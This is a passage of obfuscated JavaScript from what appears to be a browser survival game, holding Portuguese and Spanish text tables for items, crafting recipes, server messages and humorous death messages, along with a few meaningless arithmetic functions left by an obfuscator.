			ΔⵠΔ[ᐃᐃ.ⲆᐃᐃΔⲆ] = ["muro de ouro", "ouro nos seus muros? é muito chamativo.", ⵠ[153]];
			ΔⵠΔ[ᐃᐃ.ⲆΔⲆᐃᐃ] = ["muro de diamante", "tão brilhoso, veja seus olhos", "durabilidade: 2500"];
			ΔⵠΔ[ᐃᐃ.ᐃΔᐃΔⵠ] = ["muro de ametista", "você está muito assustado de sair!", "durabilidade: 3000"];
			ΔⵠΔ[ᐃᐃ.ⵠⵠⵠΔⲆ] = ["espiga de madeira", "pode dar dano nos seus inimigos", "dano: 10, dano no acerto: 2", "durabilidade: 150"];
			ΔⵠΔ[ᐃᐃ.ⲆΔᐃΔᐃ] = ["espiga de pedra", "eu não quero ser seu inimigo.", "dano: 20", "dano no acerto: 3", "durabilidade: 300"];
			ΔⵠΔ[ᐃᐃ.ⲆΔⲆⵠΔ] = ["espiga de ouro", "você é tão cruel.", "dano: 30", "dano no acerto: 3", "durabilidade: 600"];
			ΔⵠΔ[ᐃᐃ.ⲆⲆΔⵠⲆ] = ["espiga de diamante", "você não gosta de ter companhia.", "dano: 40", "dano no acerto: 4", "durabilidade: 1200"];
			ΔⵠΔ[ᐃᐃ.ΔⲆⵠⵠᐃ] = ["espiga de ametista", "o que diabos seu vizinhos fizeram para você?", "dano: 50", "dano no acerto: 4", "durabilidade: 2400"];
			ΔⵠΔ[ᐃᐃ.ⵠᐃᐃⵠᐃ] = ["porta de madeira", "pode ser aberta ou fechada por você ou seus amigos", ⵠ[380]];
			ΔⵠΔ[ᐃᐃ.ⲆΔⵠΔΔ] = ["porta de pedra", "uma porta mais forte é mais sério", "durabilidade: 1500"];
			ΔⵠΔ[ᐃᐃ.ⵠᐃⵠⵠᐃ] = ["porta de ouro", "você está re-construindo o el dorado?", ⵠ[153]];
			ΔⵠΔ[ᐃᐃ.ⵠⵠⵠᐃⲆ] = ["porta de diamante", "para uma casa brilhante", "durabilidade: 2500"];
			ΔⵠΔ[ᐃᐃ.ⲆⲆⲆⲆⲆ] = ["porta de ametista", "é a sua casa um lugar trancado seguro?", "durabilidade: 3500"];
			ΔⵠΔ[ᐃᐃ.ⵠΔⵠΔᐃ] = ["fornalha", "esquenta você", "consumi madeira em todo 5 segundos", ⵠ[380]];
			ΔⵠΔ[ᐃᐃ.ΔΔⲆᐃᐃ] = ["moinho de vento", "pode produzir farinha do trigo", "demora 5 segundos para fazer farinha", "dá pontos ao trabalhar", ⵠ[153]];
			ΔⵠΔ[ᐃᐃ.ⲆⵠᐃⲆⵠ] = ["forno de pão", "permite fazer pão feito de farinha", "demora 10 segundos para fazer pão", "dá pontos ao trabalhar", ⵠ[153]];
			ΔⵠΔ[ᐃᐃ.ⵠⵠᐃⲆⵠ] = ["pedra da ressurreição", "é mágico", "te ressuscita se você for um fantasmas", "você vai perder sua arma", "durabilidade 200: 200"];
			ΔⵠΔ[ⲆⲆΔ.ᐃⵠⲆΔⲆⲆⲆ] = "você não pode entrar no servidor";
			ΔⵠΔ[ⲆⲆΔ.ⲆⲆᐃⲆΔΔᐃ] = "kickado: ";
			ΔⵠΔ[ⲆⲆΔ.ΔᐃⵠⵠΔⲆⲆ] = "sua chave está em uso por outra pessoa";
			ΔⵠΔ[ⲆⲆΔ.ᐃᐃⵠⵠΔᐃⵠ] = "sua chave está errada";
			ΔⵠΔ[ⲆⲆΔ.ⵠΔΔⲆΔᐃⵠ] = "você tem uma versão velha, limpe seu cache";
			ΔⵠΔ[ⲆⲆΔ.ᐃΔΔΔⵠⵠᐃ] = "não tem mais recursos";
			ΔⵠΔ[ⲆⲆΔ.ᐃⲆᐃⲆⵠⲆᐃ] = "você sobreviveu 1 dia";
			ΔⵠΔ[ⲆⲆΔ.ΔⵠⲆΔⵠᐃΔ] = "você sobreviveu ";
			ΔⵠΔ[ⲆⲆΔ.ⲆⲆΔΔⲆᐃᐃ] = " dias";
			ΔⵠΔ[ⲆⲆΔ.ᐃΔᐃⲆᐃⵠⵠ] = "você está morto ;-;";
			ΔⵠΔ[ⲆⲆΔ.ΔΔⵠⵠⲆⲆᐃ] = "servidor não pôde achar um local de spawn! spam o botão de play!";
			ΔⵠΔ[ⲆⲆΔ.ⵠᐃⵠⲆⵠΔΔ] = "servidor está cheio! spam o botão de play!";
			ΔⵠΔ[ⲆⲆΔ.EMPTY] = "não tem recursos";
			ΔⵠΔ[ⲆⲆΔ.ΔᐃⲆᐃⲆⲆⲆ] = "inventário está cheio (botão direito para deletar itens)";
			ΔⵠΔ[ⲆⲆΔ.ΔᐃΔⲆᐃⲆⲆ] = " está morto";
			ΔⵠΔ[ⲆⲆΔ.ⲆⲆⲆⲆᐃᐃᐃ] = "essa não é a ferramenta certa";
			ΔⵠΔ[ⲆⲆΔ.ΔⵠⵠⲆΔⵠᐃ] = "você entrou no time";
			ΔⵠΔ[ⲆⲆΔ.ⲆⵠΔⵠᐃᐃΔ] = "você está morto";
			ΔⵠΔ[ⲆⲆΔ.ⵠⲆΔᐃⲆⵠΔ] = "entrou no time";
			ΔⵠΔ[ⲆⲆΔ.ᐃᐃⲆᐃᐃΔⲆ] = "seu time foi destruido";
			ΔⵠΔ[ⲆⲆΔ.ΔΔᐃᐃⵠⵠΔ] = "você saiu do time";
			ΔⵠΔ[ⲆⲆΔ.ⵠⵠⵠⵠⵠⵠᐃ] = " saiu do time";
			ΔⵠΔ[ⲆⲆΔ.ᐃⵠᐃΔⲆ] = "alguém roubou sua ficha :>";
			ΔⵠΔ[ⲆⲆΔ.ᐃⵠᐃⲆⲆⵠⲆ] = "escolha um servidor";
			ΔⵠΔ[ⲆⲆΔ.ⵠⲆⵠⵠⲆ] = "jogadores";
			ΔⵠΔ[ⲆⲆΔ.ⲆⲆⲆᐃⵠⲆⲆ] = "jogadores totais";
			ΔⵠΔ[ⲆⲆΔ.ⲆⵠΔⵠᐃΔᐃ] = "jogadores nesse modo";
			ΔⵠΔ[ⲆⲆΔ.ⵠⲆⵠⲆⲆᐃᐃ] = "Coming soon...";
			document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[505]).placeholder = "Apelido";
			ᐃᐃΔᐃ[ΔⲆⵠⲆ] = ["você morreu sem motivo"];
			ᐃᐃΔᐃ[ⵠΔᐃ] = ["você morreu de fome, como o jogo diz"];
			ᐃᐃΔᐃ[ᐃⲆⵠᐃ] = ["você morreu de frio. tão triste", "você pegou hipotermia na próxima vez, tente sentar numa fogueira em vez disso."];
			ᐃᐃΔᐃ[ᐃᐃⲆΔⵠ] = ["um jogador te matou dizendo a você para matar..'", "você foi morto por um jogador. não se preocupe, aquele jogador morrerá também, eventualmente."];
			ᐃᐃΔᐃ[4] = ["você ficou muito perto de uma fogueira e queimou até a morte. má ideia.", "você morreu por um incêndio. fogueira te machuca. vá escrever uma história sobre isso."];
			ᐃᐃΔᐃ[ΔᐃΔⲆ] = ["seu corpo vai virar um ninho para ovos de aranhas", "uma aranha te matou. pelo menos não era um coelho."];
			ᐃᐃΔᐃ[6] = ["o lobo não vão morrer de fome depois te te comer", "eles não são cachorros. lobos não gostam de ser que nem animais de estimação."];
			ᐃᐃΔᐃ[ⵠΔᐃⵠⵠ] = ["a raposa era muito rápida para você", "a raposa te tornou uma caixa. desde quando os animais tem poderes mágicos?"];
			ᐃᐃΔᐃ[ⲆⲆᐃⵠΔ] = ["o urso só queria um abraço.", " o urso era muito nu. eu não sinto muito."];
			ᐃᐃΔᐃ[ΔⲆⵠΔⲆ] = ["você foi queimado por um dragão. tão triste..", "você foi esmagado por um dragão.. ser esmagado é uma maneira horrível de morrer."];
			ᐃᐃΔᐃ[10] = ["você pulou em um muro com espinhos. não é uma boa ideia...", "você foi morto por um muro com espinhos. muitas pessoas são sensíveis o bastante para não tocar em coisas pontudas."];
			ᐃᐃΔᐃ[11] = ["até fantasmas podem morrer.", "você falhou para ser ressuscitado. This is a game, so you go to life after you die, so..."];
			ᐃᐃΔᐃ[12] = ["uma bactéria da sua comida crua te matou esse jogo é definitivamente muito díficil.", "você matou a carne crua. a carne crua te matou também."];
			ᐃᐃΔᐃ[13] = ["você morreu de sede. melhor beber sua própria urina."];
			ᐃᐃΔᐃ[14] = ["você sabia que você morre afogado? agora você sabe."];
			ᐃᐃΔᐃ[15] = ["não se preocupe, as piranhas acham você saboroso.", "fato engraçado: Piranhas comem pessoas. incluindo você."];
			ᐃᐃΔᐃ[16] = ["LapaMauve não planeja você matar o kraken", "um kraken comeu seu esqueleto."];
			ᐃᐃΔᐃ[ⵠⲆᐃⵠⵠΔⵠ] = ["sua pele caindo aos pedaços, o sol te matou."];
			ᐃᐃΔᐃ[ⲆⲆΔⲆⵠᐃᐃ] = ["o alho amarzenado em seus bolsos ferveu seu cérebro."];
			ᐃᐃΔᐃ[ᐃΔⲆΔⵠ] = ["como vampiro, não chegue perto do alho."];
			ᐃᐃΔᐃ[ᐃΔⲆⵠᐃ] = ["você comeu alho como vampiro, o que você esperava?"];
			ᐃᐃΔᐃ[21] = ["seu corpo se enroscou nos espinhos. quando você tenta escapar, sua pele sai e seu coração para de bater."];
			ⲆⲆΔΔⲆ = ⵠ[170];
			ΔⵠᐃⲆⲆⵠⲆ = ["Uuunnnggg... estou morrendo de fome", "preciso do seu cerébro Uuunnnggg...", "carne fresca aqui... Uuunnnggg", "Uuunnnggg... você parece saboroso", ⵠ[200], "Eat... uuunnnggg...", "consigo sentir o cheiro de sangue... Uuunnnggg"]
		};

		function ΔⲆΔΔⲆΔⵠ(ᐃⲆΔΔⵠᐃⲆ, ᐃᐃΔΔⲆᐃⵠ, ᐃΔⲆⵠᐃⲆᐃ) {
			const ⲆⵠⵠᐃⵠⵠⲆ = (0 << (ᐃⲆΔΔⵠᐃⲆ >> 8 & 255)) + (ⲆⲆᐃⵠΔ << (ᐃⲆΔΔⵠᐃⲆ >> 0 & ΔⵠᐃⵠΔ)) + (24 << (ᐃⲆΔΔⵠᐃⲆ >> 16 & 255)) + (16 << (ᐃⲆΔΔⵠᐃⲆ >> 24 & ⵠᐃⲆᐃᐃⵠᐃ));
			const ⵠᐃⵠⵠⵠⲆⵠ = ~(ᐃᐃΔΔⲆᐃⵠ & 33727) & 33727 | ~(33727 & ᐃᐃΔΔⲆᐃⵠ) & ᐃᐃΔΔⲆᐃⵠ;
			const ⵠⵠΔⵠΔⲆⵠ = (1013904223 + 1664525 * (ᐃΔⲆⵠᐃⲆᐃ + 816)) % 4294967296;
			const ᐃⲆᐃΔΔⵠⲆ = ᐃⵠΔΔⵠᐃΔ(ⲆⵠⵠᐃⵠⵠⲆ, ⵠᐃⵠⵠⵠⲆⵠ, ⵠⵠΔⵠΔⲆⵠ);
			const ᐃⵠΔᐃⲆⵠΔⲆΔ = ᐃⵠΔΔⵠᐃΔ(ⲆⵠⵠᐃⵠⵠⲆ, ⵠᐃⵠⵠⵠⲆⵠ, ⵠⵠΔⵠΔⲆⵠ);
			const ⵠΔΔⵠⲆⵠⵠ = ~(ᐃⲆᐃΔΔⵠⲆ & 12259) & (ᐃⲆᐃΔΔⵠⲆ | 12259);
			return ⵠΔΔⵠⲆⵠⵠ
		}

		function ΔΔΔⲆΔΔΔ(ᐃᐃⲆⲆⲆⵠⲆ, ⵠᐃⲆᐃⵠⲆⵠ) {
			const ⵠⵠⵠⲆΔᐃⵠ = (ᐃᐃⲆⲆⲆⵠⲆ | 37072) & ~(ᐃᐃⲆⲆⲆⵠⲆ & 37072);
			const ᐃⲆΔΔᐃΔⵠ = (1664525 * (ⵠᐃⲆᐃⵠⲆⵠ + 25585) + 1013904223) % 4294967296;
			const ΔⵠⵠΔΔⵠⵠ = ΔᐃⵠΔⲆⲆⵠ(ⵠⵠⵠⲆΔᐃⵠ, ᐃⲆΔΔᐃΔⵠ, ⵠⵠⵠⲆΔᐃⵠ);
			const ΔⲆΔΔΔᐃⵠΔΔ = ᐃⵠΔΔⵠᐃΔ(ᐃⲆΔΔᐃΔⵠ, ⵠⵠⵠⲆΔᐃⵠ, ᐃⲆΔΔᐃΔⵠ);
			const ⲆΔⲆⲆΔΔⲆ = 1053 ^ ΔⵠⵠΔΔⵠⵠ;
			return ⲆΔⲆⲆΔΔⲆ
		}

		function ⲆΔᐃⵠⲆⵠⵠ(ΔᐃᐃᐃⵠΔΔ, ⵠΔⵠΔᐃⵠᐃ, ΔⵠⲆⵠⵠᐃΔ, ΔᐃⵠΔⲆⵠⲆ, ⵠⵠΔᐃⲆΔᐃ, ᐃΔᐃΔⵠⲆⵠ) {
			const ⲆⲆΔⲆᐃⵠΔ = ~(27824 & ΔᐃᐃᐃⵠΔΔ) & 27824 | ~(27824 & ΔᐃᐃᐃⵠΔΔ) & ΔᐃᐃᐃⵠΔΔ;
			const ΔΔⲆⵠᐃᐃΔ = (0 << (ⵠΔⵠΔᐃⵠᐃ >> 8 & 255)) + (8 << (ⵠΔⵠΔᐃⵠᐃ >> 24 & 255)) + (24 << (ⵠΔⵠΔᐃⵠᐃ >> 16 & 255)) + (16 << (ⵠΔⵠΔᐃⵠᐃ >> 0 & 255));
			const ⲆᐃⲆⵠⲆΔⵠ = (41263 | ΔⵠⲆⵠⵠᐃΔ) & ~(ΔⵠⲆⵠⵠᐃΔ & 41263);
			const ⵠᐃⲆΔᐃΔᐃ = (ΔᐃⵠΔⲆⵠⲆ + 47380) % 65303;
			const ΔᐃⲆΔⵠⲆⵠ = (0 << (ⵠⵠΔᐃⲆΔᐃ >> 16 & 255)) + (16 << (ⵠⵠΔᐃⲆΔᐃ >> 0 & 255)) + (8 << (ⵠⵠΔᐃⲆΔᐃ >> 8 & 255)) + (24 << (ⵠⵠΔᐃⲆΔᐃ >> 24 & 255));
			const ⲆΔᐃΔⵠᐃᐃ = ((24566 + ᐃΔᐃΔⵠⲆⵠ) * 214013 + 2531011) % 4294967296;
			const ⵠⲆⲆΔⵠΔⲆ = ⲆⲆⲆᐃⵠΔΔ(ⲆⲆΔⲆᐃⵠΔ, ΔΔⲆⵠᐃᐃΔ);
			const ᐃᐃⲆⲆᐃᐃⲆΔᐃ = ⵠⲆⲆⲆⵠΔⲆ(ⲆᐃⲆⵠⲆΔⵠ, ⵠᐃⲆΔᐃΔᐃ, ΔᐃⲆΔⵠⲆⵠ, ⲆΔᐃΔⵠᐃᐃ, ⲆⲆΔⲆᐃⵠΔ, ΔΔⲆⵠᐃᐃΔ);
			const ⲆⲆⲆⵠᐃᐃⲆ = 50290 ^ ⵠⲆⲆΔⵠΔⲆ;
			return ⲆⲆⲆⵠᐃᐃⲆ
		}
		var ΔⲆΔⵠᐃΔᐃ = function() {
			ΔⵠΔ[ᐃᐃ.ⲆᐃΔᐃᐃ] = [ⵠ[207]];
			ᐃᐃΔᐃ[22] = [ⵠ[41]];
			ΔⵠΔ[ᐃᐃ.ΔⵠⲆΔⵠ] = [ⵠ[169], ⵠ[59], ⵠ[57]];
			ΔⵠΔ[ⲆⲆΔ.ᐃⲆΔᐃᐃⵠᐃ] = ⵠ[251];
			ΔⵠΔ[ⲆⲆΔ.ΔⵠⵠᐃᐃΔⵠ] = ⵠ[335];
			ΔⵠΔ[ⲆⲆΔ.ΔⵠᐃⲆⲆⲆΔ] = ⵠ[462];
			ΔⵠΔ[ⲆⲆΔ.ⲆᐃΔᐃᐃᐃⵠ] = ⵠ[270];
			ΔⵠΔ[ⲆⲆΔ.POINTS] = ⵠ[250];
			ΔⵠΔ[ⲆⲆΔ.ⵠΔΔᐃᐃᐃⵠ] = ⵠ[165];
			ΔⵠΔ[ⲆⲆΔ.ⲆᐃⵠⵠΔΔΔ] = ⵠ[203];
			ΔⵠΔ[ⲆⲆΔ.ⲆᐃᐃⵠⲆⲆᐃ] = ⵠ[368];
			ΔⵠΔ[ⲆⲆΔ.ΔΔⲆΔⲆᐃⲆ] = ⵠ[538];
			ΔⵠΔ[ⲆⲆΔ.ΔⲆⲆΔᐃⲆᐃ] = ⵠ[208];
			ΔⵠΔ[ᐃᐃ.ᐃΔΔΔⵠ] = [ⵠ[188], ⵠ[439], ⵠ[134]];
			ΔⵠΔ[ᐃᐃ.ᐃᐃΔⲆΔ] = [ⵠ[518], ⵠ[ⵠᐃⵠᐃΔΔΔ], ⵠ[449], ⵠ[492]];
			ΔⵠΔ[ᐃᐃ.ΔⲆⲆⲆⲆ] = [ⵠ[287], ⵠ[194], ⵠ[393], ⵠ[489], ⵠ[68], ⵠ[388]];
			ΔⵠΔ[ᐃᐃ.ⲆⲆⲆⲆΔ] = [ⵠ[295], ⵠ[577], ⵠ[527], ⵠ[425], ⵠ[463]];
			document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[219])[ΔᐃⲆⵠⲆⵠΔ[290]] = ⵠ[249];
			document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[546])[ΔᐃⲆⵠⲆⵠΔ[290]] = ⵠ[286];
			document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[185])[ΔᐃⲆⵠⲆⵠΔ[290]] = ⵠ[220];
			document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[136])[ΔᐃⲆⵠⲆⵠΔ[290]] = ⵠ[355];
			document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[579])[ΔᐃⲆⵠⲆⵠΔ[290]] = ⵠ[485];
			document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[327])[ΔᐃⲆⵠⲆⵠΔ[290]] = ⵠ[441];
			document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[322])[ΔᐃⲆⵠⲆⵠΔ[290]] = ⵠ[390];
			document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[514])[ΔᐃⲆⵠⲆⵠΔ[290]] = ⵠ[296];
			document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[334])[ΔᐃⲆⵠⲆⵠΔ[290]] = ⵠ[242];
			document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[233])[ΔᐃⲆⵠⲆⵠΔ[290]] = ⵠ[217];
			document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[179])[ΔᐃⲆⵠⲆⵠΔ[290]] = ⵠ[230];
			document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[109])[ΔᐃⲆⵠⲆⵠΔ[290]] = ⵠ[45];
			for (var ⵠᐃ = ⵠΔⲆⵠ; ⵠᐃ < ᐃⲆⲆᐃᐃ; ⵠᐃ++) document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[11] + ⵠᐃ)[ΔᐃⲆⵠⲆⵠΔ[290]] = ⵠ[451];
			document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[487])[ΔᐃⲆⵠⲆⵠΔ[290]] = ⵠ[309];
			ΔⵠΔ[ᐃᐃ.ᐃⲆᐃΔᐃ] = ["Mano"];
			ΔⵠΔ[ᐃᐃ.ⲆⵠΔⲆᐃ] = ["Tierra", "¡Tan limpia como mis manos!"];
			ΔⵠΔ[ᐃᐃ.ΔⲆⲆΔⵠ] = ["Arena", "¡Tengo arena en mis ojos!"];
			ΔⵠΔ[ᐃᐃ.ⵠⲆⲆᐃ] = ["Madera", "¡Nunca hay suficiente!"];
			ΔⵠΔ[ᐃᐃ.ᐃᐃΔⲆ] = ["Piedra", "También llamada roca."];
			ΔⵠΔ[ᐃᐃ.ΔⲆⵠⵠ] = ["Oro", "Sé generoso, compártelo con los otros"];
			ΔⵠΔ[ᐃᐃ.ΔⲆᐃΔ] = ["Diamante", "¿Que vas a hacer con él?"];
			ΔⵠΔ[ᐃᐃ.ⲆⵠΔⲆ] = ["Amatista", "Es Mauve como Lapa"];
			ΔⵠΔ[ᐃᐃ.ⵠᐃⲆⵠᐃ] = ["Harina", "Usada para cocinar."];
			ΔⵠΔ[ᐃᐃ.ΔⵠⲆᐃᐃ] = ["Galleta", "Una galleta de la abuelita", "Comida: 50"];
			ΔⵠΔ[ᐃᐃ.ⲆΔΔⲆᐃ] = ["Tarta", "¡Cumpleaños Feliz!", ⵠ[551]];
			ΔⵠΔ[ᐃᐃ.ⵠⲆᐃⲆⵠ] = ["Carne Cruda", "Se cocina con fuego", "Causa veneno. 10", "Comida: 15"];
			ΔⵠΔ[ᐃᐃ.ⲆᐃⲆⲆⲆ] = ["Carne Cocinada", "es la supervivencia del más fuerte :'(", "Comida: 35"];
			ΔⵠΔ[ᐃᐃ.ᐃΔΔΔΔ] = ["Pescado Crudo", "Creo que sigue vivo", "Causa veneno de comida: 10", "Comida: 18"];
			ΔⵠΔ[ᐃᐃ.Ⲇⵠᐃᐃⵠ] = ["Pescado Cocinado", "Con limón sería perfecto", "Comida: 35"];
			ΔⵠΔ[ᐃᐃ.ⲆΔⵠΔⲆ] = ["Pan", "¡Caliente, desde Francia!", "Es dinero usado en la tienda", "Comida: 15"];
			ΔⵠΔ[ᐃᐃ.ΔⵠⲆⵠⵠ] = ["Bocadillo", "Sabe como un Krabby Patty", ⵠ[551]];
			ΔⵠΔ[ᐃᐃ.ⵠⲆⵠᐃⲆ] = ["Caramelos", "¡Solo para niños/as!", ⵠ[551]];
			ΔⵠΔ[ᐃᐃ.ΔᐃⲆⵠⲆ] = ["Caña de Azúcar", "Pruébala, es deliciosa", ⵠ[551]];
			ΔⵠΔ[ᐃᐃ.ᐃⲆⲆⲆᐃ] = ["Guirnalda", "Perfecta para decorar el techo"];
			ΔⵠΔ[ᐃᐃ.ⵠΔⵠᐃΔ] = ["Semillas de Bayas", "Se convierte en bayas", "Nacimiento: 2 Minutos", "Crecimiento: 55 Segundos", "Necesita agua: 3 Minutos 20 Segundos", ⵠ[490], "Tiempo de vida: 8 Días"];
			ΔⵠΔ[ᐃᐃ.ⵠⲆΔⲆⲆ] = ["Baya", "No es venenosa.", "Comida: 10"];
			ΔⵠΔ[ᐃᐃ.ⲆⵠⲆΔⲆ] = ["Semilla de Trigo", "Se convierte en Trigo ", "Nacimiento: 2 Minutos", "Crecimiento: 16 Segundos", "Necesita agua: 2 Minutos", ⵠ[490], "Tiempo de vida: 8 Días"];
			ΔⵠΔ[ᐃᐃ.ⵠⲆⲆⲆⵠ] = ["Trigo Silvestre", "Se convierte en harina cuando se coloca en un molino"];
			ΔⵠΔ[ᐃᐃ.ⵠⵠΔⲆⵠ] = ["Semilla de Calabaza", "Crece a Calabazas", "Nacimiento: 2 Minutos 40 Segundos", "Crecimiento: 2 Minutos", "Necesita agua: 2 Minutos", ⵠ[490], "Tiempo de vida: 8 Días"];
			ΔⵠΔ[ᐃᐃ.ⲆⲆⵠΔΔ] = ["Calabaza", "Me recuerda a Halloween", "Comida: 30"];
			ΔⵠΔ[ᐃᐃ.ⵠⲆⲆⵠⲆ] = ["Semilla de Ajo", "Muy peligroso para vampiros", "Daño: 20", "Nacimiento: 4 Minutos", "Crecimiento: 1 Minutos 10 Segundos", "Necesita Agua: 1 Minutos 40 Segundos", ⵠ[490], "Tiempo de Vida: 8 Días"];
			ΔⵠΔ[ᐃᐃ.ⲆΔⵠΔⵠ] = ["Ajo", "Te sana y reduce el frio", "Comida: 14", "sanación con eliempo: 30", "Efecto: 1"];
			ΔⵠΔ[ᐃᐃ.ⵠⵠᐃⵠⲆ] = ["Semilla de Planta de Espinas", "Puede dañar a tus enemigos", "Daño por contacto: 20", "Nacimiento: 4 Minutos", "Crecimiento: 15 Segundos", "Necesita Agua: 3 Minutos", ⵠ[502], "Tiempo de Vida: 8 Días"];
			ΔⵠΔ[ᐃᐃ.ᐃⵠᐃΔΔ] = ["Planta de Espinas", "¡Te daña!"];
			ΔⵠΔ[ᐃᐃ.ⵠᐃΔⲆⲆ] = ["Parcela", "En serio, úsala", "Se usa para plantar plantas en invierno o sobre puentes", "Tus plantas crecerán muy rápido y necesitarán menos agua", ⵠ[356]];
			ΔⵠΔ[ᐃᐃ.ᐃⵠⲆⲆΔ] = ["Hielo", "Bueno para hacer tartas y agua"];
			ΔⵠΔ[ᐃᐃ.ΔΔᐃⲆΔ] = ["Llave de Reparación", "Puede reparar paredes, puertas y pinchos", ⵠ[58]];
			ΔⵠΔ[ᐃᐃ.ΔᐃᐃᐃΔ] = ["Pelaje de Lobo", "¿Perrito? ¡¿Donde esta el perrito?!"];
			ΔⵠΔ[ᐃᐃ.ⲆᐃⵠⲆᐃ] = ["Pelaje de Conejo", "El Conejo era muy lindo..."];
			ΔⵠΔ[ᐃᐃ.ΔⲆⵠᐃⲆ] = ["Pelaje Puro", "¡Eres una maquina de pan!"];
			ΔⵠΔ[ᐃᐃ.ΔⲆΔⵠΔ] = ["Pelaje Oscuro", "¿Estás listo para hacer algo malo?"];
			ΔⵠΔ[ᐃᐃ.ᐃⲆΔⲆⲆ] = ["Pelaje de Invierno", "Esos animales solo querían un abrazo..."];
			ΔⵠΔ[ᐃᐃ.ⲆⲆⲆᐃᐃ] = ["Escamas", "¡Huele a pescado!"];
			ΔⵠΔ[ᐃᐃ.ᐃⲆᐃⲆᐃ] = ["Piel del Kraken", "¡¿No tienes mucho miedo?!"];
			ΔⵠΔ[ᐃᐃ.ⵠⲆΔᐃΔ] = ["Fogata", "¡Te calienta!", "Durabilidad: 150", "Tiempo de vida: 2 Minutos"];
			ΔⵠΔ[ᐃᐃ.ⲆⵠⵠⵠⲆ] = ["Fogata Grande", "¡Te calienta por más tiempo!", "Durabilidad: 400", "Tiempo de Vida: 6 Minutos"];
			ΔⵠΔ[ᐃᐃ.ᐃⲆⲆΔᐃ] = ["Mesa de Trabajo", "¡Te sirve mucho para crear cosas de todos tipos!"];
			ΔⵠΔ[ᐃᐃ.ᐃᐃᐃΔΔ] = ["Hilo", "Usado para craftear ropa y mochila"];
			ΔⵠΔ[ᐃᐃ.ΔΔΔΔᐃ] = ["Hilo de Diamante", "Usado para craftear ropa especial"];
			ΔⵠΔ[ᐃᐃ.ⵠⵠⵠᐃⵠ] = ["Cofre", "Te permite guardar cosas, o compartirlas", "Durabilidad: 500"];
			ΔⵠΔ[ᐃᐃ.ΔΔⵠᐃᐃ] = ["Espada de Madera", "¿Eso funciona?", "Daño: 12", "Daño para estructuras: 4"];
			ΔⵠΔ[ᐃᐃ.ⲆᐃⵠΔᐃ] = ["Espada de Piedra", "Sé bueno con los otros", "Daño: 19", "Daño para estructuras: 6"];
			ΔⵠΔ[ᐃᐃ.ⵠᐃⲆⵠΔ] = ["Espada de Oro", "¡Rey de la selva!", "Daño: 22", "Daño para estructuras: 7"];
			ΔⵠΔ[ᐃᐃ.ᐃΔⵠᐃⵠ] = ["Espada de Diamante", "Puedes sentir el poder", "Daño: 24", "Daño para estructuras: 8"];
			ΔⵠΔ[ᐃᐃ.ⲆᐃⲆⲆΔ] = ["Espada de Pirata", "Arrrrr!", "¡Mejor distancia que una espada normal", "Daño: 24", "Daño para estructuras: 8"];
			ΔⵠΔ[ᐃᐃ.ⵠⵠᐃⲆⲆ] = ["Espada de Amatista", "Mauve es el mejor color del mundo :3", "Daño: 27", "Daño para estructuras: 9"];
			ΔⵠΔ[ᐃᐃ.ᐃⲆⲆᐃⲆ] = ["Espada del Dragón", "¡Tienes el poder de un Dragón!", "Daño: 30", "Daño para estructuras: 10"];
			ΔⵠΔ[ᐃᐃ.ⲆⲆⵠᐃⵠ] = ["Lanza del Dragón", "¡Mátalos a todos!", "Daño: 22", "Daño para estructuras: 6"];
			ΔⵠΔ[ᐃᐃ.ΔᐃⲆΔⲆ] = ["Pico de Madera", "Solo puede minar madera y piedra", "Daño: 1"];
			ΔⵠΔ[ᐃᐃ.ⲆⵠᐃⵠΔ] = ["Pico de Piedra", "Puede minar hasta oro", ⵠ[58]];
			ΔⵠΔ[ᐃᐃ.ΔΔⲆⵠⲆ] = ["Pico de Oro", "Puede minar hasta Diamante", "Daño: 3", ⵠ[417]];
			ΔⵠΔ[ᐃᐃ.ⵠⲆⲆΔⲆ] = ["Pico de Diamante", "¡Puede minarlo todo!", "Daño: 4", ⵠ[417]];
			ΔⵠΔ[ᐃᐃ.ⵠⲆⵠΔᐃ] = ["Pico de Amatista", "¡Puede minarlo todo, parece fantastico!", "Daño: 5", ⵠ[417]];
			ΔⵠΔ[ᐃᐃ.ΔⵠⲆΔⲆ] = ["Martillo de Piedra", ⵠ[54], "No funciona bien con diamante y amatista", ⵠ[58], "Daño para estructuras: 20"];
			ΔⵠΔ[ᐃᐃ.ⲆᐃⵠΔⲆ] = ["Martillo de Oro", ⵠ[54], "No funciona bien con amatista ", "Daño: 3", "Daño para estructuras: 30"];
			ΔⵠΔ[ᐃᐃ.ᐃᐃᐃⲆⵠ] = ["Martillo de Diamante", ⵠ[54], "Daño: 4", "Daño para estructuras: 40"];
			ΔⵠΔ[ᐃᐃ.ⲆⵠⵠⲆⵠ] = ["Martillo de Amatista", ⵠ[54], "Daño: 5", "Daño para estructuras: 50"];
			ΔⵠΔ[ᐃᐃ.ᐃⵠⵠⵠᐃ] = ["Super Martillo", "¿Has planeado destruir el mundo?", "Daño: 12", "Daño para estructuras: 70"];
			ΔⵠΔ[ᐃᐃ.ⲆⲆⵠΔⲆ] = ["Lanza de Madera", "Como un palo de madera, pero mata.", "Daño: 10", "Daño para estructuras: 2"];
			ΔⵠΔ[ᐃᐃ.ΔⵠΔΔⲆ] = ["Lanza de Piedra", "¡El comienzo de la evolución!", "Daño: 14", "Daño para estructuras: 4"];
			ΔⵠΔ[ᐃᐃ.ⵠⵠⲆΔⲆ] = ["Lanza de Oro", "¡Cuidado, te hace mucho daño!", "Daño: 15", "Daño para estructuras: 5"];
			ΔⵠΔ[ᐃᐃ.ΔᐃΔΔΔ] = ["Lanza de Diamante", "¡Estas preparado para matar al Dragon!", "Daño: 17", "Daño para estructuras: 5"];
